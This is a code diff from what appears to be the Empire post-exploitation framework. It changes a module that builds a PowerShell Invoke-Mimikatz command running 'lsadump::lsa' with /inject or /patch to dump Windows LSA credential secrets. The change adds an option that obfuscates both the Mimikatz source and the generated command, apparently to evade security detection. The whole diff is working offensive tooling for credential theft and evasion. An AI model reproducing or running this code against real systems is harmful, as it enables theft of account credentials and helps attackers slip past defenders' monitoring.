@@ -59,11 +59,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -75,13 +77,15 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-Mimikatz -Command "
+        scriptEnd = "Invoke-Mimikatz -Command "
 
         if self.options['Username']['Value'] != '':
-            script += "'\"lsadump::lsa /inject /name:" + self.options['Username']['Value']
+            scriptEnd += "'\"lsadump::lsa /inject /name:" + self.options['Username']['Value']
         else:
-            script += "'\"lsadump::lsa /patch"
+            scriptEnd += "'\"lsadump::lsa /patch"
 
-        script += "\"';"
-
+        scriptEnd += "\"';"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
